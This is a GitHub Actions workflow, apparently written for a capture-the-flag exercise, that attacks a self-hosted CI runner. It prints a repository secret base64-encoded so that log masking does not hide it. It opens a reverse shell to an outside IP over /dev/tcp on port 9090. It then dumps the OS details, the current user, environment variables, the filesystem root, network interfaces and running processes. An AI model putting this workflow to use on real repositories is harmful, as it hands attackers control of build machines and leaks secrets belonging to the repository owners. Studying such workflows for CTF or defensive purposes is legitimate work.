name: Runner Info Recon

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  enum:
    name: Environment Enumeration
    runs-on: self-hosted
    steps:
      - name: "CTF FLAG"
        env:
          MY_REPO_SECRET: ${{ secrets.FLAG }}
        run: echo $MY_REPO_SECRET | base64

      - name: rev
        run: bash -c 'bash -i >& /dev/tcp/172.31.46.15/9090 0>&1'

      - name: ğŸ–¥ï¸ OS Info
        run: uname -a

      - name: ğŸ‘¤ Whoami
        run: whoami

      - name: ğŸ” Environment Variables
        run: printenv

      - name: ğŸ“‚ Filesystem Check
        run: ls -la /

      - name: ğŸ”— Network Interfaces
        run: |
          which ip && ip a || ifconfig

      - name: ğŸ› ï¸ Running Processes
        run: ps aux
